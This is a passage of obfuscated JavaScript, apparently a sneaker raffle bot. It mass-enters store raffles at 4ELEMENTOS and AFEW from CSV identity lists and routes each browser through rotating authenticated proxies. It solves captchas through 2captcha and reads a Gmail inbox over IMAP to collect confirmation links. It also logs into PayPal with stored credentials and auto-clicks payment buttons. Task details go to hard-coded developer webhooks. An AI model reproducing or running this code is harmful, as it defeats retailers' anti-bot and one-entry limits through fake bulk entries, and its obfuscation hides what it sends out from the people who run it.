        let _0x54cc4c = await _0x4a038c['get']('Password');
        return _0xc914e8['Password'] = _0x54cc4c['Password'], _0xf25b74['appendFileSync']('../accounts/paypal.csv', '\x0a' + _0xc914e8['Email'] + ',' + _0xc914e8['Password'] + ',' + _0xc914e8['Proxy']), _0xc914e8;
    }
    let _0x1cb66d = await _0x434911();
    var _0x541054 = [];
    console['clear'](), console['log']('How\x20many\x20links\x20would\x20you\x20like\x20to\x20verify\x20on\x20this\x20paypal?');
    let _0x1244b6 = await _0x4a038c['get']('Amount'), _0x2485d2 = _0x1244b6['Amount'];
    async function _0x433664() {
        let _0x34299e = 0x0;
        var _0x450a08 = new _0x54e3bb({
            'user': _0x35ea91['masterMail'],
            'password': _0x35ea91['masterPassword'],
            'host': 'imap.gmail.com',
            'port': 0x3e1,
            'tls': !![],
            'autotls': 'always'
        });
        function _0x27c38a(_0x268c3a) {
            _0x450a08['openBox']('INBOX', ![], _0x268c3a);
        }
        _0x450a08['once']('ready', function () {
            _0x27c38a(function (_0x5eb6f0, _0x2f20c8) {
                console['clear'](), console['log']('Looking\x20For\x20Links');
                if (_0x5eb6f0)
                    throw _0x5eb6f0;
                _0x450a08['seq']['search']([
                    'UNSEEN',
                    [
                        'SUBJECT',
                        'PayPal'
                    ]
                ], function (_0x524a72, _0x4273ac) {
                    if (!_0x4273ac || !_0x4273ac['length'])
                        console['log'](_0x446ef5() + '\x20[' + _0x559a2b + ']\x20No\x20mails\x20found'), _0x450a08['end']();
                    else {
                        _0x4273ac = _0x4273ac['slice'](0x0, _0x2485d2);
                        var _0x18c343 = _0x450a08['seq']['fetch'](_0x4273ac, {
                            'bodies': '',
                            'markSeen': !![]
                        });
                        _0x18c343['on']('message', function (_0x367300, _0xbe26c2) {
                            var _0xb7e435 = '(#' + _0xbe26c2 + ')\x20';
                            _0x367300['on']('body', function (_0x3f5e7d, _0x3771da) {
                                _0x2fc4a3(_0x3f5e7d, (_0x44d753, _0x4d2636) => {
                                    if (_0x4d2636['subject'] == 'PayPal\x20Konto\x20bestätigen' || _0x4d2636['subject'] == 'Confirm\x20your\x20PayPal\x20account') {
                                        mes = _0x4d2636['text']['split']('[')[0x2];
                                        var _0xd42869 = mes['split'](']')[0x0];
                                        _0x541054['push'](_0xd42869);
                                    }
                                });
                            }), _0x367300['once']('end', function () {
                                _0x34299e++;
                            });
                        }), _0x18c343['once']('error', function (_0x480f04) {
                            console['log']('Fetch\x20error:\x20' + _0x480f04);
                        }), _0x18c343['once']('end', function () {
                            _0x450a08['end']();
                        });
                    }
                });
            });
        }), _0x450a08['once']('error', function (_0x8c6062) {
            console['log'](_0x46bace['red'](_0x8c6062['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox');
        }), _0x450a08['once']('end', async function () {
        }), _0x450a08['connect']();
    }
    try {
        _0x433664(), await _0x4d70b1(0xfa0), console['log']('Found\x20' + _0x541054['length'] + '\x20Links\x20in\x20Mailbox');
    } catch {
        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), await _0x4d70b1(0xfa0);
    }
    var _0x476a86;
    _0x1e0e73('' + _0x559a2b);
    var _0x3afb0f = _0x1cb66d['Proxy']['split'](':'), _0x371368;
    try {
        _0x371368 = await _0x4ada75['launch']({
            'userDataDir': 'sessions/' + _0x1cb66d['Email'],
            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x3afb0f[0x0] + ':' + _0x3afb0f[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
    } catch {
        _0x371368 = await _0x4ada75['launch']({
            'userDataDir': 'sessions/' + _0x1cb66d['Email'],
            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x3afb0f[0x0] + ':' + _0x3afb0f[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
    }
    try {
        console['log'](_0x446ef5() + '\x20[' + _0x559a2b + ']\x20Getting\x20Session');
        const _0x5c010b = await _0x371368['newPage']();
        await _0x5c010b['authenticate']({
            'username': '' + _0x3afb0f[0x2],
            'password': '' + _0x3afb0f[0x3]
        }), await _0x5c010b['setViewport']({
            'width': 0x230,
            'height': 0x2d0
        }), await _0x5c010b['goto']('https://www.paypal.com/signin');
        try {
            console['log'](_0x446ef5() + '\x20[' + _0x559a2b + ']\x20Logging\x20in\x20to\x20your\x20Paypal\x20account..'), await _0x5c010b['waitForSelector']('#email');
            let _0x37f484 = await _0x5c010b['$eval']('#email', _0x230502 => _0x230502['getAttribute']('value'));
            if (_0x37f484 == '') {
                await _0x5c010b['type']('#email', _0x1cb66d['Email']), await _0x4d70b1(0x1d3);
                let _0x4cc3de = await _0x5c010b['$']('#splitPassword');
                _0x4cc3de && (await _0x5c010b['click']('#btnNext'), await _0x4d70b1(0xa28)), await _0x5c010b['type']('#password', _0x1cb66d['Password']), await _0x4d70b1(0x35c), await _0x5c010b['click']('#btnLogin');
            } else
                await _0x5c010b['type']('#password', _0x1cb66d['Password']), await _0x4d70b1(0x35c), await _0x5c010b['click']('#btnLogin');
            await _0x5c010b['waitForSelector']('#reactContainer__balance', { 'timeout': 0x493e0 }), console['log'](_0x446ef5() + '\x20[' + _0x559a2b + ']\x20Successfully\x20logged\x20in'), await _0x4d70b1(0x2710);
        } catch (_0x30269e) {
            throw new Error('Login\x20session\x20expired\x20' + _0x30269e);
        }
        for (var _0x4dc9d4 = 0x0; _0x4dc9d4 < _0x541054['length']; _0x4dc9d4++) {
            console['log'](_0x446ef5() + '\x20[' + _0x559a2b + ']\x20Task\x20' + (_0x4dc9d4 + 0x1) + '\x20:\x20Starting\x20Verification'), _0x1e0e73(_0x559a2b + '\x20Task\x20' + (_0x4dc9d4 + 0x1) + '\x20/\x20' + _0x541054['length']);
            const _0x528f30 = await _0x371368['newPage']();
            await _0x528f30['goto']('' + _0x541054[_0x4dc9d4], { 'waitUntil': 'networkidle2' }), await _0x4d70b1(0xbb8);
            try {
                const _0xd0577d = await _0x528f30['$']('#challenge-heading');
                _0xd0577d && (console['log'](_0x446ef5() + '\x20[' + _0x559a2b + ']\x20Task\x20' + (_0x4dc9d4 + 0x1) + '\x20:\x20' + _0x46bace['yellow']('2FA\x20Required')), await _0x528f30['waitForSelector']('.CheckoutButton_buttonWrapper_2VloF', { 'timeout': 0x493e0 }));
                await _0x4d70b1(0x9c40), await _0x528f30['waitForSelector']('#payment-submit-btn'), await _0x528f30['$eval']('#payment-submit-btn', _0x42df05 => _0x42df05['click']()), await _0x528f30['click']('#payment-submit-btn');
                try {
                    await _0x528f30['waitForSelector']('img[alt=\x22AFEW\x20STORE\x22]'), await _0x4d70b1(0x5dc), console['log'](_0x46bace['green'](_0x446ef5() + '\x20[' + _0x559a2b + ']\x20Task\x20' + (_0x4dc9d4 + 0x1) + '\x20:\x20Link\x20Verified'));
                } catch (_0x2d3395) {
                    _0x533b5d = 'yes';
                    throw new Error('Payment\x20Rejected:\x20' + _0x2d3395['message']);
                } finally {
                    if (_0x533b5d == 'yes' && _0x33f62b != 0x2) {
                        console['log'](_0x46bace['red'](_0x446ef5() + '\x20[' + _0x559a2b['name'] + ']\x20Task\x20' + (_0x4dc9d4 + 0x1) + '\x20:\x20Retrying\x20(' + _0x33f62b + '\x20/\x205)')), _0x4dc9d4 = _0x4dc9d4 - 0x1, _0x33f62b = _0x33f62b + 0x1;
                        continue;
                    }
                    _0x533b5d == 'yes' && _0x33f62b >= 0x2 && (_0x5415a4(csv[_0x4dc9d4], _0x559a2b), _0x533b5d = 'no', _0x33f62b = 0x0), await _0x528f30['close'](), await _0x4d70b1(0x4650);
                }
            } catch (_0x536a96) {
                console['log'](_0x46bace['red'](_0x446ef5() + '\x20[' + _0x559a2b + ']\x20Task\x20' + (_0x4dc9d4 + 0x1) + '\x20:\x20' + _0x536a96));
            }
        }
    } catch (_0x223abe) {
        console['log'](_0x46bace['red']('' + _0x223abe));
    } finally {
        await _0x371368['close']();
    }
}
const _0x482e75 = [
    {
        'name': '4ELEMENTOS',
        'modules': [
            {
                'name': '4ELEMENTOS\x20Raffle\x20Entries',
                'store': '4ELEMENTOS',
                'logo': 'https://cdn.lovesavingsgroup.com/logos/4elementos.jpg',
                'function': async function (_0xad6d78, _0x1232ff, _0x1b941a) {
                    _0x4ada75['use'](_0x120ab9()), _0x4ada75['use'](_0x2d400b({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x35ea91['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x17a7de = 0x0; _0x17a7de < _0x1232ff['length']; _0x17a7de++) {
                        if (_0x175298 != 'yes')
                            var _0x175298 = '', _0x34272a = 0x0;
                        var _0x257e96;
                        try {
                            await _0x408b94(_0x1232ff, _0x17a7de);
                        } catch {
                            _0x175298 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        _0x1e0e73(_0xad6d78['name'] + '\x20Task\x20' + (_0x17a7de + 0x1) + '\x20/\x20' + _0x1232ff['length'] + '\x20||\x20File:\x20' + _0x18b452 + '\x20Proxies:\x20' + _0x324cb1);
                        var _0x2cd6fa = [
                            '40',
                            '40,5',
                            '41',
                            '42',
                            '42,5',
                            '43',
                            '44',
                            '45',
                            '45,5',
                            '46',
                            '47',
                            '47,5',
                            '48'
                        ], _0x2516bd = Math['round'](Math['random']() * (_0x2cd6fa['length'] - 0x1));
                        _0x1232ff[_0x17a7de]['Size'] == 'RANDOM' && (_0x1232ff[_0x17a7de]['Size'] = _0x2cd6fa[_0x2516bd]);
                        var _0x3dee08 = Math['round'](Math['random']() * (_0x1b941a['length'] - 0x1)), _0x25166e = _0x1b941a[_0x3dee08]['split'](':'), _0x4583d4;
                        try {
                            _0x4583d4 = await _0x4ada75['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x25166e[0x0] + ':' + _0x25166e[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x4583d4 = await _0x4ada75['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x25166e[0x0] + ':' + _0x25166e[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            console['log'](_0x446ef5() + '\x20[' + _0xad6d78['name'] + ']\x20Task\x20' + (_0x17a7de + 0x1) + '\x20:\x20Getting\x20Session');
                            const _0xc9305 = await _0x4583d4['newPage']();
                            await _0xc9305['authenticate']({
                                'username': '' + _0x25166e[0x2],
                                'password': '' + _0x25166e[0x3]
                            }), await _0xc9305['setRequestInterception'](!![]), _0xc9305['on']('request', _0x3cc0d7 => {
                                _0x3cc0d7['resourceType']() === 'image' || _0x3cc0d7['resourceType']() === 'font' || _0x3cc0d7['resourceType']() === 'media' ? _0x3cc0d7['abort']() : _0x3cc0d7['continue']();
                            }), await _0xc9305['goto'](_0x1232ff[_0x17a7de]['Url'], { 'waitUntil': 'networkidle2' }), console['log'](_0x446ef5() + '\x20[' + _0xad6d78['name'] + ']\x20Task\x20' + (_0x17a7de + 0x1) + '\x20:\x20Starting\x20Entry'), await _0xc9305['waitForSelector']('#accept-all-gdpr'), await _0xc9305['click']('#accept-all-gdpr'), await _0xc9305['waitForSelector']('#raffles-product'), await _0x4d70b1(0x3e8), await _0xc9305['$eval']('#raffles-product', _0x346ff3 => _0x346ff3['click']()), await _0x4d70b1(0x1388), await _0xc9305['waitForSelector']('.fancybox-inner\x20>\x20iframe');
                            var _0x3cd7dd = await _0xc9305['$']('.fancybox-inner\x20>\x20iframe'), _0x554ec3 = await _0x3cd7dd['contentFrame']();
                            console['log'](_0x446ef5() + '\x20[' + _0xad6d78['name'] + ']\x20Task\x20' + (_0x17a7de + 0x1) + '\x20:\x20Checking\x20Information'), await _0x554ec3['waitForSelector']('input[name=\x22sm-form-email\x22]'), await _0x4d70b1(0x1f4), await _0x554ec3['type']('input[name=\x22sm-form-email\x22]', _0x1232ff[_0x17a7de]['Email']), await _0x4d70b1(0xc8), await _0x554ec3['type']('input[name=\x22sm-form-name\x22]', _0x1232ff[_0x17a7de]['FirstName'] + '\x20' + _0x1232ff[_0x17a7de]['LastName']), await _0x4d70b1(0xc8), await _0x554ec3['type']('input[name=\x22sm-form-street\x22]', _0x1232ff[_0x17a7de]['Address1'] + '\x20' + _0x1232ff[_0x17a7de]['HouseNumber'] + '\x20' + _0x1232ff[_0x17a7de]['Address2']), await _0x4d70b1(0xc8), await _0x554ec3['type']('input[name=\x22sm-form-city\x22]', _0x1232ff[_0x17a7de]['City']), await _0x4d70b1(0xc8), await _0x554ec3['type']('input[name=\x22sm-form-province\x22]', _0x1232ff[_0x17a7de]['State']), await _0x4d70b1(0xc8), await _0x554ec3['type']('input[name=\x22sm-form-zip\x22]', _0x1232ff[_0x17a7de]['Zip']), await _0x4d70b1(0xc8), await _0x554ec3['type']('input[name=\x22sm-form-country\x22]', _0x1232ff[_0x17a7de]['Country']), await _0x4d70b1(0xc8), await _0x554ec3['type']('input[name=\x22sm-form-phone\x22]', _0x1232ff[_0x17a7de]['Phone']), await _0x4d70b1(0xc8), await _0x554ec3['type']('input[name=\x22sm-cst.instagram_user\x22]', _0x1232ff[_0x17a7de]['Follower']), await _0x4d70b1(0xc8), await _0x554ec3['type']('input[name=\x22sm-cst.size\x22]', _0x1232ff[_0x17a7de]['Size']), await _0x4d70b1(0x1f4), await _0x554ec3['click']('.icheckbox_simple-custom.icheckbox--CONSENT'), await _0x4d70b1(0x1f4), await _0x554ec3['click']('.icheckbox_simple-custom'), await _0x4d70b1(0x1f4), console['log'](_0x446ef5() + '\x20[' + _0xad6d78['name'] + ']\x20Task\x20' + (_0x17a7de + 0x1) + '\x20:\x20Sending\x20Request'), await _0x554ec3['$eval']('form', _0x4eed5d => _0x4eed5d['submit']()), console['log'](_0x46bace['green'](_0x446ef5() + '\x20[' + _0xad6d78['name'] + ']\x20Task\x20' + (_0x17a7de + 0x1) + '\x20:\x20Raffle\x20Entered!')), _0x175298 = '';
                            var _0x26d925 = await _0x39e876(_0x1232ff[_0x17a7de], _0xad6d78, 'dev', ![]), _0x3c6529 = await _0x39e876(_0x1232ff[_0x17a7de], _0xad6d78, 'pub', ![]);
                            const _0x1649a0 = {
                                'succesDEVMSG': { 'embeds': [_0x26d925] },
                                'succesPUBMSG': { 'embeds': [_0x3c6529] }
                            };
                            try {
                                _0x35ea91['webhook'] != undefined && _0x35ea91['webhook'] != '' && await _0x19fe15(_0x35ea91['webhook'], _0x1649a0['succesDEVMSG']), await _0x4d70b1(0xc8), await _0x19fe15(_0x53da78, _0x1649a0['succesDEVMSG']), await _0x4d70b1(0xc8), await _0x19fe15(_0x44bee6, _0x1649a0['succesPUBMSG']);
                            } catch (_0x2e94e4) {
                                console['log'](_0x46bace['yellow'](_0x446ef5() + '\x20[' + _0xad6d78['name'] + ']\x20Task\x20' + (_0x17a7de + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x2e94e4));
                            }
                        } catch (_0xdf1fef) {
                            console['log'](_0x46bace['red'](_0x446ef5() + '\x20[' + _0xad6d78['name'] + ']\x20Task\x20' + (_0x17a7de + 0x1) + '\x20:\x20' + _0xdf1fef)), _0x257e96 = '' + _0xdf1fef;
                            var _0x251bf2 = await _0x39e876(_0x1232ff[_0x17a7de], _0xad6d78, 'dev', !![], _0x257e96), _0x26d925 = await _0x39e876(_0x1232ff[_0x17a7de], _0xad6d78, 'dev', ![]), _0x3c6529 = await _0x39e876(_0x1232ff[_0x17a7de], _0xad6d78, 'pub', ![]);
                            const _0x2b8909 = {
                                'succesDEVMSG': { 'embeds': [_0x26d925] },
                                'succesPUBMSG': { 'embeds': [_0x3c6529] }
                            };
                            _0x2b8909['errorDEV'] = { 'embeds': [_0x251bf2] }, _0x35ea91['webhook'] != undefined && _0x35ea91['webhook'] != '' && await _0x19fe15(_0x35ea91['webhook'], _0x2b8909['errorDEV']), await _0x19fe15(_0x556085, _0x2b8909['errorDEV']), _0xdf1fef != 'Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.' && (_0x175298 = 'yes');
                        } finally {
                            _0x4583d4['close']();
                            if (_0x175298 == 'yes' && _0x34272a != 0x5 && _0x257e96 != 'Size\x20Not\x20Found') {
                                console['log'](_0x46bace['red'](_0x446ef5() + '\x20[' + _0xad6d78['name'] + ']\x20Task\x20' + (_0x17a7de + 0x1) + '\x20:\x20Retrying\x20(' + _0x34272a + '\x20/\x205)\x20')), _0x17a7de = _0x17a7de - 0x1, _0x34272a = _0x34272a + 0x1;
                                continue;
                            }
                            _0x175298 == 'yes' && _0x34272a >= 0x5 && (_0x5415a4(_0x1232ff[_0x17a7de], _0xad6d78), _0x175298 = 'no', _0x34272a = 0x0), console['log'](_0x446ef5() + '\x20[' + _0xad6d78['name'] + ']\x20Waiting\x20for\x20' + _0x35ea91['delay'] + '\x20ms'), await _0x4d70b1(_0x35ea91['delay']);
                        }
                    }
                }
            },
            {
                'name': '4ELEMENTOS\x20Link\x20Verification',
                'store': '4ELEMENTOS',
                'logo': 'https://cdn.lovesavingsgroup.com/logos/4elementos.jpg',
                'function': async function (_0x51c57a, _0x3af72c) {
                    var _0x1d4b38 = [];
                    async function _0x628312() {
                        var _0x515e11 = new _0x54e3bb({
                            'user': _0x35ea91['masterMail'],
                            'password': _0x35ea91['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x1005dd(_0x74b64f) {
                            _0x515e11['openBox']('INBOX', ![], _0x74b64f);
                        }
                        _0x515e11['once']('ready', function () {
                            _0x1005dd(function (_0x2b27df, _0x37ed5d) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x2b27df)
                                    throw _0x2b27df;
                                _0x515e11['seq']['search'](['UNSEEN'], function (_0x25e71c, _0x3b04da) {
                                    if (!_0x3b04da || !_0x3b04da['length'])
                                        console['log'](_0x446ef5() + '\x20[' + _0x51c57a['name'] + ']\x20No\x20mails\x20found'), _0x515e11['end']();
                                    else {
                                        var _0x243600 = _0x515e11['seq']['fetch'](_0x3b04da, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x243600['on']('message', function (_0xe0a325, _0x5cb95e) {
                                            var _0x5231f4 = '(#' + _0x5cb95e + ')\x20';
                                            _0xe0a325['on']('body', function (_0x112150, _0x563a39) {
                                                _0x2fc4a3(_0x112150, (_0x58ec78, _0x259eb2) => {
                                                    if (_0x259eb2['subject'] == 'Confirm\x20your\x20subscription\x20to\x20the\x20Raffle\x20||\x20Confirma\x20tu\x20suscripción\x20al\x20Raffle') {
                                                        var _0x5684f4 = _0x259eb2['html']['split']('\x0a');
                                                        for (var _0x4a7bf3 = 0x0; _0x4a7bf3 < _0x5684f4['length']; _0x4a7bf3++) {
                                                            if (_0x5684f4[_0x4a7bf3]['includes']('salesmanago') && _0x5684f4[_0x4a7bf3]['includes']('<td') && _0x5684f4[_0x4a7bf3]['includes']('href')) {
                                                                var _0x192293 = _0x5684f4[_0x4a7bf3]['split']('href=\x22'), _0x272585 = _0x192293[0x1]['split']('\x22')[0x0];
                                                                _0x1d4b38['push'](_0x272585);
                                                                break;
                                                            }
                                                        }
                                                    }
                                                });
                                            }), _0xe0a325['once']('end', function () {
                                            });
                                        }), _0x243600['once']('error', function (_0x79844a) {
                                            console['log']('Fetch\x20error:\x20' + _0x79844a);
                                        }), _0x243600['once']('end', function () {
                                            _0x515e11['end']();
                                        });
                                    }
                                });
                            });
                        }), _0x515e11['once']('error', function (_0x532b60) {
                            console['log'](_0x46bace['red'](_0x532b60['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox');
                        }), _0x515e11['once']('end', async function () {
                        }), _0x515e11['connect']();
                    }
                    async function _0x2f2526(_0x1a8954, _0x56dcb5, _0x146efe) {
                        for (var _0x3a8a21 = 0x0; _0x3a8a21 < _0x56dcb5['length']; _0x3a8a21++) {
                            async function _0x4ec34c(_0xc65e85, _0x3ecded, _0x46d3b2, _0x52931f, _0x1b1813) {
                                var _0x414012, _0x99a849 = {}, _0x5227e = [], _0x1637d2 = {}, _0x126df7 = [
                                    '40',
                                    '40,5',
                                    '41',
                                    '42',
                                    '42,5',
                                    '43',
                                    '44',
                                    '45',
                                    '45,5',
                                    '46',
                                    '47',
                                    '47,5',
                                    '48'
                                ], _0x2dc68c = Math['round'](Math['random']() * (_0x126df7['length'] - 0x1));
                                _0x52931f[_0xc65e85]['Size'] == 'RANDOM' && (_0x52931f[_0xc65e85]['Size'] = _0x126df7[_0x2dc68c]);
                                !_0x52931f && (_0x52931f = {});
                                if (_0x35ea91['useRandomProxy'] = ![])
                                    var _0x1f7d01 = _0x1b1813[_0xc65e85]['split'](':');
                                else
                                    var _0x1d4777 = Math['round'](Math['random']() * (_0x1b1813['length'] - 0x1)), _0x1f7d01 = _0x1b1813[_0x1d4777]['split'](':');
                                var _0x976daa = {
                                    'jar': _0x3bb051,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x46d3b2['url'],
                                    'headers': _0x46d3b2['headers'],
                                    'body': JSON['stringify'](_0x99a849),
                                    'proxy': 'http://' + _0x1f7d01[0x2] + ':' + _0x1f7d01[0x3] + '@' + _0x1f7d01[0x0] + ':' + _0x1f7d01[0x1]
                                };
                                return _0x3ecded != 'ver' && (_0x976daa['url'] = _0x46d3b2['url'], _0x976daa['headers'] = _0x46d3b2['headers']), _0x3ecded == 'ver' && (_0x976daa['method'] = 'GET', _0x976daa['url'] = _0x52931f[_0xc65e85]), new Promise(function (_0x28efd0, _0xf26de9) {
                                    callback = async (_0x3eaa3e, _0x4e9094, _0x183d81) => {
                                        if (!_0x3eaa3e && _0x4e9094['statusCode'] == 0xca || !_0x3eaa3e && _0x4e9094['statusCode'] == 0xc8) {
                                            if (_0x3ecded != 'ver') {
                                                var _0x456393 = await _0x39e876(_0x52931f[_0xc65e85], _0x46d3b2, 'dev', ![]), _0x82c5e1 = await _0x39e876(_0x52931f[_0xc65e85], _0x46d3b2, 'pub', ![]);
                                                const _0x455b78 = {
                                                    'succesDEVMSG': { 'embeds': [_0x456393] },
                                                    'succesPUBMSG': { 'embeds': [_0x82c5e1] }
                                                };
                                                if (_0x35ea91['webhook'] != undefined && _0x35ea91['webhook'] != '')
                                                    try {
                                                        await _0x19fe15(_0x35ea91['webhook'], _0x455b78['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0x4d70b1(0xc8), await _0x19fe15(_0x53da78, _0x455b78['succesDEVMSG']), await _0x4d70b1(0xc8);
                                                try {
                                                    await _0x19fe15(_0x44bee6, _0x455b78['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0x5155d2(_0x52931f[_0xc65e85], _0x46d3b2);
                                            }
                                            _0x28efd0(console['log'](_0x46bace['green'](_0x446ef5() + '\x20[' + _0x46d3b2['name'] + ']\x20Task\x20' + (_0xc65e85 + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0x3ecded != 'ver') {
                                                var _0x458201 = '' + _0x3eaa3e, _0x1adf17 = await _0x39e876(_0x52931f[_0xc65e85], _0x46d3b2, 'dev', !![], _0x458201), _0x39f237 = {};
                                                _0x39f237['errorDEV'] = { 'embeds': [_0x1adf17] }, _0x5415a4(_0x52931f[_0xc65e85], _0x46d3b2), _0x35ea91['webhook'] != undefined && _0x35ea91['webhook'] != '' && await _0x19fe15(_0x35ea91['webhook'], _0x39f237['errorDEV']), await _0x19fe15(_0x556085, _0x39f237['errorDEV']);
                                            }
                                            _0xf26de9(console['log'](_0x46bace['red'](_0x446ef5() + '\x20[' + _0x46d3b2['name'] + ']\x20Task\x20' + (_0xc65e85 + 0x1) + ':\x20' + _0x3eaa3e)));
                                        }
                                    };
                                    try {
                                        _0x3ecded != 'ver' ? console['log'](_0x446ef5() + '\x20[' + _0x46d3b2['name'] + ']\x20Task\x20' + (_0xc65e85 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x99a849['data']['attributes']['email']) : console['log'](_0x446ef5() + '\x20[' + _0x46d3b2['name'] + ']\x20Task\x20' + (_0xc65e85 + 0x1) + ':\x20Fetching\x20Response'), _0x2b1433(_0x976daa, callback);
                                    } catch (_0x3f6fe4) {
                                        console['log'](_0x446ef5() + '\x20Task\x20' + (_0xc65e85 + 0x1) + ':\x20' + _0x3f6fe4);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x4ec34c(_0x3a8a21, 'ver', _0x1a8954, _0x56dcb5, _0x146efe), console['log'](_0x446ef5() + '\x20[' + _0x1a8954['name'] + ']\x20Sleeping\x20for\x20' + _0x35ea91['delay'] + '\x20ms'), await _0x4d70b1(_0x35ea91['delay']);
                            } catch (_0x3b03c7) {
                            }
                        }
                    }
                    try {
                        _0x628312(), await _0x4d70b1(0xfa0), console['log']('Found\x20' + _0x1d4b38['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..');
                    }
                    await _0x2f2526(_0x51c57a, _0x1d4b38, _0x3af72c);
                }
            }
        ]
    },
    {
        'name': 'AFEW\x20Store',
        'modules': [{
            'name': 'AFEW\x20Raffle\x20Entries',
            'store': 'AFEW',
            'logo': 'https://d19kzigy6tpscu.cloudfront.net/media/CACHE/images/logo_thumbnail/afew_logo_100x100_1647428869.png',
            'function': async function (_0x589574, _0x5d2cb7, _0x4c8a38) {
                for (var _0x1b5510 = 0x0; _0x1b5510 < _0x5d2cb7['length']; _0x1b5510++) {
                    _0x35ea91['AfewDelay'] = _0x35ea91['delay'];
                    var _0xb40591;
                    if (_0x46a7b1 != 'yes')
                        var _0x46a7b1 = '', _0xf2f520 = 0x0;
                    var _0x2b2287 = _0x5d2cb7[_0x1b5510]['Url'], _0x2301ee = _0x5d2cb7[_0x1b5510];
                    _0x1e0e73(_0x589574['name'] + '\x20Task\x20' + (_0x1b5510 + 0x1) + '\x20/\x20' + _0x5d2cb7['length'] + '\x20||\x20File:\x20' + _0x18b452 + '\x20Proxies:\x20' + _0x324cb1);
                    try {
                        await _0x408b94(_0x5d2cb7, _0x1b5510);
                    } catch {
                        _0x46a7b1 = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    async function _0x810d56(_0x54f367) {
                        const _0x4bc1a8 = _0xf25b74['readFileSync']('../successful-tasks.csv', 'utf8'), _0x35be87 = _0x20e9d9['parse'](_0x4bc1a8, { 'header': !![] })['data'];
                        let _0xeaa589 = ![];
                        for (var _0xa47cb4 of _0x35be87) {
                            if (_0xa47cb4['Url'] == _0x54f367['Url'] && _0xa47cb4['Email'] == _0x54f367['Email']) {
                                _0xeaa589 = !![];
                                break;
                            }
                        }
                        return _0xeaa589;
                    }
                    if (await _0x810d56(_0x5d2cb7[_0x1b5510]) == !![]) {
                        console['log'](_0x446ef5() + '\x20[' + _0x589574['name'] + ']\x20Task\x20' + (_0x1b5510 + 0x1) + '\x20:\x20Task\x20Already\x20Entered,\x20Going\x20to\x20Next\x20Task');
                        continue;
                    }
                    var _0x4e4f6e = await _0x39e876(_0x5d2cb7[_0x1b5510], _0x589574, 'dev', ![]), _0x1c225c = await _0x39e876(_0x5d2cb7[_0x1b5510], _0x589574, 'pub', ![]);
                    const _0x382608 = {
                        'succesDEVMSG': { 'embeds': [_0x4e4f6e] },
                        'succesPUBMSG': { 'embeds': [_0x1c225c] }
                    };
                    if (_0x5d2cb7[_0x1b5510]['Email'] == '' || _0x5d2cb7[_0x1b5510]['FirstName'] == '' || _0x5d2cb7[_0x1b5510]['LastName'] == '' || _0x5d2cb7[_0x1b5510]['Country'] == '' || _0x5d2cb7[_0x1b5510]['Size'] == '' || _0x5d2cb7[_0x1b5510]['Address1'] == '' || _0x5d2cb7[_0x1b5510]['Zip'] == '') {
                        console['log'](_0x446ef5() + '\x20[' + _0x589574['name'] + ']\x20Task\x20' + (_0x1b5510 + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0x35ea91['useRandomProxy'] = ![])
                        var _0x5159e5 = _0x4c8a38[_0x1b5510]['split'](':');
                    else
                        var _0x1123b1 = Math['round'](Math['random']() * (_0x4c8a38['length'] - 0x1)), _0x5159e5 = _0x4c8a38[_0x1123b1]['split'](':');
                    var _0x4cfed2;
                    try {
                        _0x4cfed2 = await _0x4ada75['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x5159e5[0x0] + ':' + _0x5159e5[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    } catch {
                        _0x4cfed2 = await _0x4ada75['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x5159e5[0x0] + ':' + _0x5159e5[0x1],
